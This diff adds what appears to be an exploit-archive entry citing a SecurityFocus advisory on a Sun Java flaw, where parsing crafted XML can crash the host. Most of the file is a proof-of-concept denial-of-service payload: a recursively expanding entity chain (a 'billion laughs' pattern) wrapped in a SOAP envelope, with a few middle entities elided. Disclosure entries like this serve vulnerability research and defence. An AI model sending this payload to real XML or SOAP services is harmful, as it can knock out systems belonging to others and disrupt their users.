@@ -1,0 +1,5 @@
+source: http://www.securityfocus.com/bid/8666/info
+
+A problem has been identified in Sun Java when handling XML documents with specific constructs. Because of this, an attacker with the ability to cause the software to parse malicious XML documents may have the ability to crash a system hosting Sun Java. 
+
+<?xml version="1.0" encoding ="UTF-8"?> <!DOCTYPE foobar[ <!ENTITY x100 "foobar"> <!ENTITY x99 "&x100;&x100;"> <!ENTITY x98 "&x99;&x99;"> ... <!ENTITY x2 "&x3;&x3;"> <!ENTITY x1 "&x2;&x2;"> ]><SOAP-ENV:Envelope xmlns:SOAP-ENV=...><SOAP-ENV:Body><ns1:aaa xmlns:ns1="urn:aaa" SOAP-ENV:encodingStyle="..."><foobar xsi:type="xsd:string">&x1;</foobar></ns1:aaa></SOAP-ENV:Body></SOAP-ENV:Envelope> 
